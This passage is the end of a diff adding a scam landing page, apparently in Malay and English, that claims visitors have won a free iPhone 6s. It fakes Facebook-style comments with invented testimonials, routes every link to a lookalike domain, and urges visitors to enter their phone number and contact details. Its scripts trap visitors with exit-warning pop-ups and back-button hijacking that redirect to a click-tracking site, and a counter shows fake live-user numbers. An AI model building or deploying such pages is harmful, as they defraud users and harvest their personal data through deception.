+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            document.write(date("d F"));
+                                        </script>
+                                       at 2:34 am
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/7.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                Shelly Ortega
+                                </div>
+                                <div style="padding-top: 5px;">Got the question wrong.... Damn why ma I always so unlucky! :(
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">2</span>
+                                    </div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            var mydate = new Date()
+                                            mydate.setDate(mydate.getDate() - 3);
+                                            document.write(date("d F", mydate));
+                                        </script>
+                                        at 11:01 am
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/8.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    <script>document.write(gsubcountry.names[7]);</script>
+                                    Mujahid Hassan
+                                </div>
+                                <div style="padding-top: 5px;">I am happy to say that this is the real deal.
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: none;"><i class="ico"></i><span class="like_count">0</span>
+                                    </div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            var mydate = new Date()
+                                            mydate.setDate(mydate.getDate() - 4);
+                                            document.write(date("d F", mydate));
+                                        </script>
+                                         at 3:45 pm
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </font>
+            </center>
+        </div>
+    </div>
+</div>
+<script language="JavaScript" type="text/javascript">
+    function exit_a1() {
+        alert("iPhone percuma anda telah disimpan!\n\nPada halaman seterusnya, masukkan nombor telefon anda untuk menuntutnya");
+        PreventExitSplash = !0
+    }
+</script>
+<script type="text/javascript" src="zepto.min.js"></script>
+<script type="text/javascript">
+    $(function () {
+        var t = $("#send-comments_text"), e = $("#send-comments_submit");
+        if (e.length && t.length) {
+            var i = '<tr class="message_active"><td width="50" valign="top" align="right"><img src="http://cdn.4plus.club/static/sweep/global/ava.png" width="50" height="50"></td><td align="left" valign="top"><div style="font-weight: bold; color:#3b5998;">Your</div><div style="padding-top: 5px;">%message%</div><div class="comments__item__meta"><div class="comments__item__meta__item">Just Now</div></div></td></tr><tr><td colspan="2"><hr></td></tr>';
+            setInterval(function () {
+                t.val().length > 3 ? e.addClass("send-comments--submit--active") : e.removeClass("send-comments--submit--active")
+            }, 500), $(".comment_replay").click(function () {
+                return $("body").scrollTop(t.offset().top), t.focus(), !1
+            }), t.parents("form").submit(function () {
+                return $("#comments_list").prepend($(i.replace(/%message%/i, t.val()))), t.val(""), setTimeout(function () {
+                    $(".message_active").removeClass("message_active")
+                }, 800), !1
+            });
+            var s = function () {
+                var t = $("#comments_list"), e = $(window).scrollTop(), i = e + $(window).height();
+                return elTop = t.offset().top, elTop <= e + i
+            };
+            if (!s()) {
+                var a = $($("#comments_list").find("tr").get(0));
+                a.addClass("message_active");
+                var n = setInterval(function () {
+                    s() && (setTimeout(function () {
+                        a.removeClass("message_active")
+                    }, 1200), clearInterval(n))
+                }, 500)
+            }
+        }
+        var o = function (t) {
+            void 0 == t && (t = $(".like_count")), t.each(function () {
+                var t = $(this), e = "none";
+                parseInt(t.text()) && (e = "inline-block"), t.parents(".comments__item__meta__item").css({display: e})
+            })
+        };
+        o(), $(".action_like").click(function () {
+            var t = $(this);
+            t.data("text-like") || t.data("text-like", t.text());
+            var e = "text-like";
+            t.text() == t.data("text-like") && (e = "text-dislike");
+            var i = t.parents(".comments__item__meta").find(".like_count"), s = parseInt(i.text());
+            return "text-dislike" == e ? s++ : s--, i.text(s), o(i), t.text(t.data(e)), !1
+        })
+    });
+</script>
+<div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+    <div style="padding: 8px;">
+        <div>
+            <div class="logo"><img src="./Congrats!_RunNan_files/translate_24dp.png" width="20" height="20"></div>
+        </div>
+    </div>
+    <div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div>
+    <div class="middle" style="padding: 8px;">
+        <div class="original-text"></div>
+    </div>
+    <div class="bottom" style="padding: 8px;">
+        <div class="activity-links"><span class="activity-link">Contribute a better translation</span><span
+                class="activity-link"></span></div>
+        <div class="started-activity-container">
+            <hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;">
+            <div class="activity-root"></div>
+        </div>
+    </div>
+    <div class="status-message" style="display: none;"></div>
+</div>
+
+<script>
+    var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+
+    function launchpopLink1() {
+        url = "http://free.stayforfit.com/click";
+        document.location.assign(url);
+        if (isSafari) {
+            window.open(
+                    'http://free.stayforfit.com/click',
+                    '_top'
+            );
+        }
+        return false;
+    }
+</script>
+<script>
+    var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+
+    function launchpopLink2() {
+        url = "http://free.stayforfit.com/click";
+        document.location.assign(url);
+        if (isSafari) {
+            window.open(
+                    'http://free.stayforfit.com/click',
+                    '_top'
+            );
+        }
+        return false;
+    }
+</script>
+<script>
+    var __redirect_to = 'http://free.stayforfit.com/click';
+    window.onbeforeunload = function () {
+        setTimeout(function () {
+            window.onbeforeunload = function () {
+            };
+            setTimeout(function () {
+                document.location.href = __redirect_to;
+            }, 500);
+        }, 5);
+        return 'ARE YOU SURE YOU WANT TO LEAVE?\n\nBy exiting this page you will no longer receive any free gift notification from us.';
+    }
+
+    function exception() {
+        window.onbeforeunload = function () {
+            null
+        };
+        alert("Congratulations " + getURLParameter('isp') + " users!\n\nYour shiny new iPhone 6s has been reserved.\nOn the next page, enter your email address and contact details..\n\nHURRY: Limited stock available.");
+    }
+</script>
+<script>var link_redirect = "http://free.stayforfit.com/click";
+if (window.history && window.history.pushState) {
+    window.onpopstate = function () {
+        var b = location.hash;
+        var a = b.split("#!/");
+        var e = a[1];
+        if (e !== "") {
+            var c = window.location.hash;
+            if (c === "") {
+                window.onbeforeunload = null;
+                window.location = link_redirect;
+                return false
+            }
+        }
+    };
+    window.history.pushState("forward", null, "#forward")
+} else {
+    var ignoreHashChange = true;
+    window.onhashchange = function () {
+        if (!ignoreHashChange) {
+            ignoreHashChange = true;
+            var b = location.hash;
+            var a = b.split("#!/");
+            var e = a[1];
+            if (e !== "") {
+                var c = window.location.hash;
+                if (c === "") {
+                    window.onbeforeunload = null;
+                    window.location = link_redirect;
+                    return false
+                }
+            }
+        } else {
+            ignoreHashChange = false
+        }
+    };
+    window.history.pushState("forward", null, "#forward")
+}
+;</script>
+<script src="picture.js"></script>
+<script>
+    //动态用户
+    var user = document.getElementById('user');
+    var m = 1732;
+    function add() {
+        m += parseInt(Math.random() * 5);
+        user.innerHTML = m;
+    }
+    setInterval('add()', 1000);
+</script>
+
+</body>
+</html>
